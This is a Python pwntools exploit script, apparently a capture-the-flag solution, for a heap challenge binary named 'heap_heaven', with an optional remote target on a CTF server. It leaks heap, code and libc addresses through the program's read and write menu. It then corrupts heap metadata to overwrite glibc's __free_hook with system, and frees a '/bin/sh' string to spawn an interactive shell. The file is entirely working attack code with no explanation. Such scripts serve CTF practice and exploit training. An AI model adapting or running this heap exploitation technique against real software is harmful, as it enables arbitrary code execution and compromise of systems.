#lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *
import time

#context.arch = 'amd64'
DEBUG = True
if DEBUG:
	io = process("./heap_heaven")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./heap_heaven")
else:
	io = remote("arcade.fluxfingers.net",1809)
	libc = ELF("libc.so.6")
	elf = ELF("./heap_heaven")

def write(index,size,content):
	#time.sleep(1)
	io.sendlineafter("exit\n","1")
	io.sendlineafter("write?\n",str(size))
	io.sendlineafter("offset?\n",str(index))
	io.send(content)

def show(index):
	io.sendlineafter("exit\n","4")
	io.sendlineafter("leak?\n",str(index))
	return io.recvuntil("\nPlease ",drop=True)
	
def free(index):
	io.sendlineafter("exit\n","3")
	io.sendlineafter("free?\n",str(index))

codebase = 0x555555554000

def debug():
	gdb.attach(io,"b *{b1}\n".format(b1=hex(codebase+0x139A)))

context.log_level = "debug"
#debug()
write(0x200,16,p64(0)+p64(0x21))
write(0x210,0x10,"a"*0x10)
write(0x220,0x10,p64(0x20)+p64(0x21))
write(0x230,0x10,"b"*0x10)
write(0x240,0x10,p64(0x20)+p64(0x21))
write(0x250,0x10,"c"*0x10)
write(0x260,0x10,p64(0x20)+p64(0xa1))
write(0x270,0x100,(p64(0xa0)+p64(0x21))*16)
#write(1,16,"b"*16)
#write(2,16,"c"*16)

free(0x210)
free(0x230)
write(0x230,0x1,"\x30")
free(0x250)
leak_mmap = u64(show(0x230).ljust(8,"\x00"))-0x230
if leak_mmap == 0:
	write(0x231,0x1,"\x10")
	leak_mmap = u64(show(0x230).ljust(8,"\x00"))-0x1230
log.success("leak_mmap:"+hex(leak_mmap))
#debug()
#write(0x0,0x8,p64(leak_mmap+0x30))
#show(0)
free(0x270)
leak_heap = u64(show(0x270).ljust(8,"\x00"))
heap_base = leak_heap - 0x40
log.success("heap_base:"+hex(heap_base))
write(0x200,16,p64(heap_base+0x10)+p64(heap_base+0x30))
show(0x200)
code_base = u64(show(0x208).ljust(8,"\x00"))-0x1670
log.success("code_base:"+hex(code_base))
write(0x210,0x8,p64(code_base+elf.got["puts"]))
puts_addr = u64(show(0x210).ljust(8,"\x00"))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
#debug()
write(0x0,0x10,p64(0)+p64(0x31))
write(0x10,0x20,p64(code_base+0x4048-0x18)+p64(code_base+0x4048-0x10)+p64(leak_mmap+0x20)*2)
write(0x30,0x10,p64(0x30)+p64(0xa0))
write(0x40,0x100,(p64(0xa0)+p64(0x21))*16)
free(0x40)
#debug()
write(0x18,0x8,p64(code_base+0x4048))
write(0x0,0x8,p64(libc.symbols["__free_hook"]))
write(0x0,0x8,p64(libc.symbols["system"]))

#write(0x8,0x8,p64(code_base+0x4048))
write(0x8,0x7,"/bin/sh")
free(0x8)
#o.sendlineafter("exit\n","3")
#io.sendlineafter("free?\n","0")
io.interactive()

